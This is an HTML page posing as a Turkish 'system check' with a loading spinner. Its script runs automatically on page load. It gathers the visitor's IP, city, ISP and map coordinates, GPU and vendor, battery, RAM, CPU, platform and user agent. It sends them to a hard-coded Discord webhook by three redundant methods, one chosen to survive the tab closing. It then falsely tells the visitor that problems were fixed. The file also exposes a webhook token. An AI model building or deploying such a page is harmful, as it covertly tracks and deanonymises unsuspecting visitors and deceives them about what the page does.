<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background-color: #0f0f0f; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .container { text-align: center; }
        .loader { border: 3px solid #333; border-top: 3px solid #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.6s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 400; font-size: 15px; margin: 0; color: #444; }
        .success-text { color: #00ff41; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader" class="loader"></div>
        <h2 id="msg">Sistem ayarlarƒ± kontrol ediliyor...</h2>
    </div>

    <script>
        // Webhook URL'ni buraya koy (URL'nin sonunda bo≈üluk olmadƒ±ƒüƒ±ndan emin ol)
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function sƒ±zma() {
            let info = { gpu: "X", ven: "X", bat: "N/A", loc: "√áekilemedi", ip: "X" };

            // 1. IP ve KONUM (ƒ∞zin ƒ∞stemez)
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                info.ip = d.ip;
                info.loc = `üìç **B√∂lge:** ${d.city}, ${d.region}\nüõ∞Ô∏è **ISP:** ${d.org}\nüîó [Haritada G√∂r](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
            } catch(e) {}

            // 2. GPU ve VENDOR (Force WebGL)
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
            } catch(e) {}

            // 3. Pƒ∞L DURUMU
            try {
                const b = await navigator.getBattery();
                info.bat = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Prizde' : 'Pilde'})`;
            } catch(e) {}

            // 4. KIRMIZI EMBED RAPORU
            const payload = {
                embeds: [{
                    title: "üïµÔ∏è KRƒ∞Tƒ∞K ANALƒ∞Z RAPORU (VAH≈ûƒ∞)",
                    color: 15158332,
                    fields: [
                        { name: "üìç LOKASYON (IP)", value: info.loc, inline: false },
                        { name: "üõ†Ô∏è DONANIM", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.ven}\`\n**RAM:** ${navigator.deviceMemory}GB | **CPU:** ${navigator.hardwareConcurrency}`, inline: false },
                        { name: "üîã DURUM", value: info.bat, inline: true },
                        { name: "üì± OS", value: navigator.platform, inline: true },
                        { name: "üîç USER AGENT", value: "```" + navigator.userAgent + "```" }
                    ],
                    timestamp: new Date()
                }]
            };

            // 5. G√ñNDERƒ∞M: MUTLAK KUVVET (3 Farklƒ± Metod Aynƒ± Anda)
            const data = JSON.stringify(payload);
            
            // Metod 1: Fetch (Standart)
            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: data }).catch(() => {});

            // Metod 2: XMLHttpRequest (Eski ama en g√º√ßl√ºs√º)
            const x = new XMLHttpRequest();
            x.open("POST", u, true);
            x.setRequestHeader("Content-Type", "application/json");
            x.send(data);

            // Metod 3: Beacon (Kapatƒ±lmaya kar≈üƒ± diren√ßli)
            navigator.sendBeacon(u, data);

            // Aray√ºz√º g√ºncelle
            document.getElementById('msg').innerHTML = '<span class="success-text">Sorunlar d√ºzeltildi.</span>';
            document.getElementById('loader').style.display = "none";
        }

        window.onload = sƒ±zma;
    </script>
</body>
</html>
